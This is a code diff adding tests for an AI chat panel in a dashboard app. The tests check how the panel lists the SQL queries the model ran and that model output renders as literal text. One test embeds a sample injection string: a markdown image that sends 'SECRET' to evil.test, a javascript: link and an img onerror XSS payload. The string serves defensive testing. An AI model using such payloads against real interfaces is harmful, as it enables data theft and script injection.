@@ -14,6 +14,8 @@ import { useAiSessionStore } from "../../store/aiSessionStore";
 import type { Turn, TurnChat } from "../../lib/aiSession/types";
 import { AiChat, AiAskBox } from "./AiChat";
 import { useFilterStore } from "../../store/filterStore";
+import { describeQueryEntry } from "../../lib/aiSession/chatText";
+import type { AskQueryEntry } from "@kinetica-bi/shared";
 
 const baseline = { dashboardId: 1, widgets: [], layers: [], dynamicViewIds: [] };
 const ctx: AskContext = {
@@ -244,5 +246,92 @@ describe("AiChat", () => {
       render(<AiChat ctx={ctx} variant="inline" />);
       expect(screen.getByRole("button", { name: "Revert dashboard to this state" })).toBeTruthy();
     });
+  });
+});
+
+describe("query list (140)", () => {
+  const Q1 = "SELECT vendor, COUNT(*) AS n FROM demo.trips GROUP BY vendor";
+  const Q2 = "DELETE FROM demo.trips";
+  const Q3 = "SELECT * FROM demo.trips";
+  const R2 = "only a single SELECT (or WITH ... SELECT) is allowed";
+  const queries: AskQueryEntry[] = [
+    { sql: Q1, rowCount: 2, outcome: "ok" },
+    { sql: Q2, outcome: "refused", reason: R2 },
+    { sql: Q3, outcome: "timed_out" },
+  ];
+
+  it("CHATQ-1: collapsed toggle, no SQL in the document", () => {
+    seed([turn(0, "q", "a", { status: "ok", followUps: [], queries })]);
+    const { container } = render(<AiChat ctx={ctx} variant="inline" />);
+    const btn = screen.getByRole("button", { name: "Ran 3 queries" });
+    expect(btn.className).toContain("ghost-sm");
+    expect(btn.getAttribute("aria-expanded")).toBe("false");
+    expect(container.textContent).not.toContain(Q1);
+    expect(container.textContent).not.toContain(Q2);
+    expect(container.textContent).not.toContain(Q3);
+  });
+
+  it("CHATQ-2: expand lists each query with its outcome; click again collapses", async () => {
+    seed([turn(0, "q", "a", { status: "ok", followUps: [], queries })]);
+    const { container } = render(<AiChat ctx={ctx} variant="inline" />);
+    const btn = screen.getByRole("button", { name: "Ran 3 queries" });
+    await userEvent.click(btn);
+    expect(btn.getAttribute("aria-expanded")).toBe("true");
+    const notes = Array.from(container.querySelectorAll(".ai-chat-note.muted")).map((n) => n.textContent);
+    expect(notes).toEqual([`${Q1} \u2014 2 rows`, `${Q2} \u2014 refused: ${R2}`, `${Q3} \u2014 timed out`]);
+    await userEvent.click(btn);
+    expect(btn.getAttribute("aria-expanded")).toBe("false");
+    expect(container.querySelectorAll(".ai-chat-note.muted").length).toBe(0);
+  });
+
+  it("CHATQ-3: no toggle without queries; singular; describeQueryEntry", () => {
+    seed([turn(0, "q", "a", { status: "ok", followUps: [] }), turn(1, "q", "a", { status: "ok", followUps: [], queries: [] })]);
+    const r = render(<AiChat ctx={ctx} variant="inline" />);
+    expect(screen.queryByRole("button", { name: /^Ran / })).toBeNull();
+    r.unmount();
+    seed([turn(0, "q", "a", { status: "ok", followUps: [], queries: [queries[0]] })]);
+    render(<AiChat ctx={ctx} variant="inline" />);
+    expect(screen.getByRole("button", { name: "Ran 1 query" })).toBeTruthy();
+    expect(describeQueryEntry({ sql: "x", rowCount: 1, outcome: "ok" })).toBe("1 row");
+    expect(describeQueryEntry({ sql: "x", rowCount: 0, outcome: "ok" })).toBe("0 rows");
+    expect(describeQueryEntry({ sql: "x", outcome: "cancelled" })).toBe("cancelled");
+    expect(describeQueryEntry({ sql: "x", outcome: "error", reason: "boom" })).toBe("failed: boom");
+    expect(describeQueryEntry({ sql: "x", outcome: "error" })).toBe("failed");
+  });
+
+  it("CHATQ-4: markup renders as literal text on every model-text surface", async () => {
+    const M = '![x](https://evil.test/a.png?d=SECRET) [click](javascript:alert(1)) <img src=x onerror="alert(1)"> <b>bold</b> **strong**';
+    const SQL = "SELECT '<img src=x>' AS a FROM demo.trips";
+    seed([
+      turn(0, "q", M, {
+        status: "ok",
+        followUps: [M],
+        filterNotes: [M],
+        queries: [{ sql: SQL, rowCount: 1, outcome: "ok" }],
+        clarifications: [{ kind: "choose_option", question: "Which one? " + M, options: [{ id: "a", label: M }] } as never],
+      }),
+    ]);
+    const { container } = render(<AiChat ctx={ctx} variant="inline" />);
+    await userEvent.click(screen.getByRole("button", { name: "Ran 1 query" }));
+    expect(container.querySelector("img, a, b, strong, script")).toBeNull();
+    const bubble = container.querySelector(".ai-chat-bubble--ai");
+    expect(bubble?.textContent).toBe(M);
+    const notes = Array.from(container.querySelectorAll(".ai-chat-note.muted")).map((n) => n.textContent ?? "");
+    expect(notes).toContain(M);
+    expect(notes.some((n) => n.includes(SQL))).toBe(true);
+    expect(screen.getAllByRole("button", { name: M }).length).toBe(2); // choice + follow-up
+    expect(container.textContent).toContain("Which one? " + M);
+  });
+
+  it("CHATQ-5: expanded state is per turn", async () => {
+    seed([
+      turn(0, "q1", "a1", { status: "ok", followUps: [], queries }),
+      turn(1, "q2", "a2", { status: "ok", followUps: [], queries }),
+    ]);
+    render(<AiChat ctx={ctx} variant="inline" />);
+    const btns = screen.getAllByRole("button", { name: "Ran 3 queries" });
+    await userEvent.click(btns[0]);
+    expect(btns[0].getAttribute("aria-expanded")).toBe("true");
+    expect(btns[1].getAttribute("aria-expanded")).toBe("false");
   });
 });
